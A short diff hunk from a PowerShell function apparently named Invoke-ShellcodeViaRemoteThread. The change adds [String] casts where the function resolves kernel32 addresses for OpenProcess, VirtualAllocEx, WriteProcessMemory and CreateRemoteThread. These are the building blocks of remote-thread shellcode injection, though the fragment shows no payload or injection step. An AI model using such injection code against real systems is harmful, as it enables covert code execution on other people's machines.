@@ -143,10 +143,10 @@ function Invoke-ShellcodeViaRemoteThread
 
     $Kernel32Handle                     = $GetModuleHandle.Invoke($null, @([String] "kernel32.dll"))
 
-    $OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, "OpenProcess"))
-    $VirtualAllocExAddress              = $GetProcAddress.Invoke($null, @($Kernel32Handle, "VirtualAllocEx"))
-    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, "WriteProcessMemory"))
-    $CreateRemoteThreadAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, "CreateRemoteThread"))
+    $OpenProcessAddress                 = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "OpenProcess"))
+    $VirtualAllocExAddress              = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "VirtualAllocEx"))
+    $WriteProcessMemoryAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "WriteProcessMemory"))
+    $CreateRemoteThreadAddress          = $GetProcAddress.Invoke($null, @($Kernel32Handle, [String] "CreateRemoteThread"))
 
     # Create delegates with our function pointers.
 
